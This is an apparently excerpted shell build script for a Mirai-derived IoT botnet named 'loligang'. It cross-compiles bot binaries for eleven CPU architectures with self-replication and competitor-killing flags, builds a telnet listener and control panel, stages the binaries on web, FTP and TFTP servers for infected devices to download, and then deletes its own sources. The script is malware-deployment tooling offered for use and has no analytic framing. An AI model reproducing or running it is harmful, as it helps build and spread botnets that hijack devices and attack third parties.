...
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/EwokFN/mysql; go get github.com/mattn/go-shellwords
function compile_bot {
    "$1-gcc" -std=c99 $3 stuff/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
...
mkdir /var/www/html
mkdir /var/www/html/lmaoWTF
mkdir /var/www/html/bins
mv index.html /var/www/html/bins
mv css /var/www/html/bins
go build -o telnet/ui ui/*.go
rm -rf ~/ui
mv ~/telnet/ui ~/
go build -o telnet/telnetlistener listener.go

compile_bot i586 loligang.x86 "-static -DCUM_KILLER -DSELFREP"
compile_bot mips loligang.mips "-static -DCUM_KILLER -DSELFREP"
compile_bot mipsel loligang.mpsl "-static -DCUM_KILLER -DSELFREP"
compile_bot armv4l loligang.arm "-static -DCUM_KILLER -DSELFREP"
compile_bot armv5l loligang.arm5 ""
compile_bot armv6l loligang.arm6 "-static -DCUM_KILLER -DSELFREP"
compile_bot armv7l loligang.arm7 "-static -DCUM_KILLER -DSELFREP"
compile_bot powerpc loligang.ppc "-static -DCUM_KILLER -DSELFREP"
compile_bot sparc loligang.spc "-static -DCUM_KILLER -DSLEFREP"
compile_bot m68k loligang.m68k "-statiC -DCUM_KILLER -DSELFREP"
compile_bot sh4 loligang.sh4 "-static -DCUM_KILLER -DSELFREP"

cp release/loligang.* /var/www/html/lmaoWTF
cp release/loligang.* /var/ftp
mv release/loligang.* /var/lib/tftpboot
rm -rf release

gcc -static -O3 -lpthread -pthread ~/telnet/src/*.c -o ~/telnet/telnet
...
mv ~/dlr/release/dlr* ~/telnet/bins
rm -rf ~/dlr ~/telnet/src ~/stuff ~/listener.go ~/Projects ~/build.sh
